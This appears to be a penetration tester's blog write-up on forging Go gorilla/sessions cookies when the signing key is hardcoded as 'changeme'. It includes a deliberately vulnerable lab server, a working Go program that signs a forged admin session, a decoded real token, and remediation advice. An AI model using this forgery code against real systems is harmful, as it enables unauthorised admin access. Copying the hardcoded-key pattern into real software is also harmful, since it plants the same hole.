---
title: "Golang Gorilla/sessions Session Forgery Risk Analysis and Reproduction"
slug: golang-gorilla-session-forgery-analysis
translationKey: golang-gorilla-session-forgery-analysis
date: 2025-05-21T12:10:24+08:00
source: yuque/penetration
---

A fairly routine testing workflow: the project runs on Go and uses the ubiquitous Gorilla/sessions to manage sessions……

# Background
The first thing I noticed was that the cookie could be base64-decoded — and then decoded a second time……



![](https://cdn.nlark.com/yuque/0/2025/png/166008/1747825417253-8441f12b-f947-41a4-a35b-6e3433230875.png)

This cookie is a typical encrypted `CookieStore` session value from [gorilla/sessions](https://github.com/gorilla/sessions), matching the format:

```plain
<timestamp>|<base64-encoded-session-data>|<MAC>
```

Where:

+ Part 1 is a timestamp
+ Part 2 is the gob-encoded session value, then base64-encoded;
+ Part 3 is an HMAC-SHA signature used to verify data integrity;
+ If we know the secret key (for example this project's hardcoded `"changeme"`), we can **decode/forge/modify the session**.



B64-decode it, and we get

```plain
1747798569|DX8EAQL_gAABEAEQAABk_4AAAQZzdHJpbmcMCwAJYXV0aF91c2VyCSp3ZWIuVXNlcv-BAwEBBFVzZXIB_4IAAQQBAklkAQwAAQhGdWxsTmFtZQEMAAEFRW1haWwBDAABDUF1dGhlbnRpY2F0ZWQBAgAAACf_giQBBWFkbWluAQVhZG1pbgERYWRtaW5AZXhhbXBsZS5jb20BAQA=|ΨVɯlDۇSY5aI0ǎߌڷӃݮŃQ
```

The <font style="color:#DF2A3F;">red part</font> is the timestamp

1747798569

The <font style="color:#74B602;">green part</font>, base64-decoded again, yields

+ Partially readable Id and email fields
+ Probably some uncommon serialization format

![](https://cdn.nlark.com/yuque/0/2025/png/166008/1747800944480-98cba594-252b-4ee0-a59f-6217b4dd9c17.png)



I wasn't expecting much at first, but while digging through the source code and request details, I happened to spot something that made me stop — the default configuration used a plaintext hardcoded key, "changeme", and… leaving that alone would just be wrong.

```dockerfile
Set-Cookie: token=MTc0Nzc5ODU2OXxEWDhFQVFMX2dBQUJFQUVRQUFCa180QUFBUVp6ZEhKcGJtY01Dd0FKWVhWMGFGOTFjMlZ5Q1NwM1pXSXVWWE5sY3YtQkF3RUJCRlZ6WlhJQl80SUFBUVFCQWtsa0FRd0FBUWhHZFd4c1RtRnRaUUVNQUFFRlJXMWhhV3dCREFBQkRVRjFkR2hsYm5ScFkyRjBaV1FCQWdBQUFDZl9naVFCQldGa2JXbHVBUVZoWkcxcGJnRVJZV1J0YVc1QVpYaGhiWEJzWlM1amIyMEJBUUE9fK6oVokvbES7R1MbEVk1YUkwpw6fTJq304Pdbg6lQ1EB; Path=/; 
```



So I followed this thread and started the reproduction and deep-dive process.

---

# Session Signing Mechanism and gob Encoding
First, some background. Gorilla/sessions is a widely used library; under the hood it relies on the securecookie module, whose main job is signing the data inside the cookie (encryption is possible, but not enabled by default).

The simplest usage looks like this:



```go
store := sessions.NewCookieStore([]byte("changeme"))
```

The meaning is clear: the cookie is signed with an HMAC-SHA algorithm, but the key is hardcoded in the source. Once it leaks, you've essentially handed over the signing system's crown jewels.



And once you store structs (such as user profile objects) in the session, things get dangerous. An attacker can construct an identical struct and sign a session themselves.

---

# Hands-On: Forging an admin Identity, Straight into the Backend
We set up a backend target lab to run the experiment

+ Create the project: `go mod init sessweb`
+ Pin the version to match the target environment: `require github.com/gorilla/securecookie v1.1.1`
+ Run: `go run main.go`

```go
package main

import (
	"encoding/gob"
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/sessions"
)

type User struct {
	Username      string
	Authenticated bool
	IsAdmin       bool
}

var (
	hashKey  = []byte("changeme")
	store    = sessions.NewCookieStore(hashKey)
	sessName = "vmango"
	sessKey  = "auth_user"
	// Simulated account/password pairs from the database
	validUsers = map[string]struct {
		Password string
		IsAdmin  bool
	}{
		"admin": {"password123", true},
		"user":  {"userpass", false},
	}
)

func init() {
	gob.Register(&User{})
}

func main() {
	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/login", handleLoginForm)
	http.HandleFunc("/do_login", handleLogin)
	http.HandleFunc("/admin", handleAdmin)

	log.Println("Server running at http://localhost:9091")
	http.ListenAndServe(":9091", nil)
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	sess, _ := store.Get(r, sessName)
	user, _ := sess.Values["user"].(*User)
	tmpl := `<h1>Index Page</h1>
	{{if .}}Hello, {{.Username}}! <a href='/admin'>Go to Admin</a>{{else}}<a href='/login'>Login</a>{{end}}`
	t := template.Must(template.New("index").Parse(tmpl))
	t.Execute(w, user)
}

func handleLoginForm(w http.ResponseWriter, r *http.Request) {
	tmpl := `<h1>Login</h1>
	<form action='/do_login' method='POST'>
	Username: <input name='username'><br>
	Password: <input type='password' name='password'><br>
	<input type='submit' value='Login'>
	</form>`
	w.Write([]byte(tmpl))
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	username := r.FormValue("username")
	password := r.FormValue("password")

	entry, ok := validUsers[username]
	if !ok || entry.Password != password {
		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
		return
	}

	sess, _ := store.Get(r, sessName)
	user := &User{
		Username:      username,
		Authenticated: true,
		IsAdmin:       entry.IsAdmin,
	}
	sess.Values["user"] = user
	sess.Save(r, w)
	fmt.Fprintf(w, "Logged in as %s. <a href='/'>Home</a>", username)
}

func handleAdmin(w http.ResponseWriter, r *http.Request) {
	sess, _ := store.Get(r, sessName)
	fmt.Printf("handleAdmin: %v\n", sess)   // present
	user, ok := sess.Values["user"].(*User) // absent
	fmt.Printf("user: %v\n", user)
	if !ok || !user.Authenticated || !user.IsAdmin {
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}
	fmt.Fprintf(w, "<h1>Admin Page</h1>Welcome, %s!", user.Username)
}
```



After logging in, the server puts something like this into the session:

```go
sess.Values["user"] = &User{
    Username: "admin",
    Authenticated: true,
    IsAdmin: true,
}
```

The cookie is named `vmango`, the struct is gob-encoded, and the key is still the classic "changeme".

So all we need to do is:

1. Register the struct;
2. Construct the data;
3. Sign it with the same key.



Then… copy-paste it into the browser, visit `/admin`, and sure enough, we're in.

```go
gob.Register(&User{})
data := map[interface{}]interface{}{
    "user": &User{
        Username: "admin",
        Authenticated: true,
        IsAdmin: true,
    },
}
cookie, _ := securecookie.Encode("vmango", data, securecookie.CodecsFromPairs([]byte("changeme"))...)
```

The signature verification passes, the logic runs as usual — no brute force, no injection, and the unauthenticated access is accomplished this elegantly (or rather, fatally).

![](https://cdn.nlark.com/yuque/0/2025/png/166008/1747824610602-906bd3d7-2b2c-4dec-b69a-959c92844434.png)

![](https://cdn.nlark.com/yuque/0/2025/png/166008/1747824594160-b83d6999-11a3-4828-b09c-00bc8c5e3db0.png)



The full exploitation code for generating the cookie is as follows

```go
package main

import (
    "encoding/gob"
    "fmt"

    "github.com/gorilla/securecookie" // We'll use this directly
)

// User struct as defined in the original application
type User struct {
    Username      string
    Authenticated bool
    IsAdmin       bool
}

var (
    // THE SECRET KEY - this must match the server's key
    hashKey    = []byte("changeme")
    sessName   = "auth_user" // The name of the session cookie (used by securecookie)
    cookie_key = "vmango"
    // Initialize a SecureCookie instance.
    // The first key is for authentication (HMAC), the second (nil here) would be for encryption.
    // Since the original code only provided one key to NewCookieStore, there's no encryption.
    sc = securecookie.New(hashKey, nil)
)

func init() {
    // Register the User type with gob so it can be serialized/deserialized
    // This is essential for securecookie's default gob serializer.``
    gob.Register(&User{})
}

func main() {

    // Create the admin user object
    session_key := "user"
    value := &User{
        Username:      "admin",
        Authenticated: true,
        IsAdmin:       true,
    }
    sign_a_cookie(session_key, value)
}

func sign_a_cookie(Key string, Value interface{}) string {
    struct_user := make(map[interface{}]interface{})
    struct_user[Key] = Value
    // Use securecookie.Decode to deserialize and verify the cookie value.
    // The 'sessName' is passed as the cookie name, which securecookie might use internally.
    codecs := securecookie.CodecsFromPairs(hashKey)
    output, _ := securecookie.EncodeMulti(cookie_key, &struct_user, codecs...)

    fmt.Println(output)
    return output
}
```



For the core signing logic, refer to: [https://github.com/gorilla/securecookie/blob/v1.1.1/securecookie.go#L282](https://github.com/gorilla/securecookie/blob/v1.1.1/securecookie.go#L282)

---

# Why Does Reproduction Fail in Some Environments?
Of course, in some real systems this trick doesn't work, and the reasons aren't hard to guess:

+ Some use a dual-key mechanism — encryption + signing together, i.e. a block_key is used
            + ![](https://cdn.nlark.com/yuque/0/2025/png/166008/1747824706928-ea0d7552-7374-48d6-b62f-ebfb8103fc57.png)
+ gob encoding validates the struct path and field order; any mismatch and it simply won't decode;
+ The cookie name doesn't match, or the key is wrong, so nothing is hit;



In other words, although we've verified the issue exists, whether it's exploitable in reality depends on luck and the environment's configuration.



---

# Risk Summary
1. The HMAC key is hardcoded; an attacker can forge signatures and fully control legitimacy
2. Storing structs in the session means the gob encoding can be constructed by an attacker, enabling arbitrary field forgery
3. Encrypted storage is not enabled, plaintext content is exposed, and sensitive fields run naked



---

# Remediation Recommendations
1. Don't hardcode the key! Put it in environment variables, or integrate a key management system;
2. Don't stuff structs into the session — a user_id is enough, and look up the rest in the database;
3. Enable encrypted storage; one less layer of readability, one more layer of security;
4. Add authentication mechanisms to the admin backend, such as IP allowlists or two-factor verification.

---



# Wrap-Up
This case once again highlights a tired-but-true and always-overlooked problem: default configurations are toxic.



Looking back, Flask suffered this kind of attack long ago, and there's even a tool for it: [https://github.com/Paradoxis/Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign)

> A command-line tool for acquiring, decoding, brute-forcing, and crafting session cookies of Flask applications by guessing secret keys.
>



In Golang gorilla, that middle stretch — gob encoding, securecookie encoding, struct reconstruction, signature generation — looks complicated, but it's merely a different implementation with exactly the same logic. Same soup, different medicine.

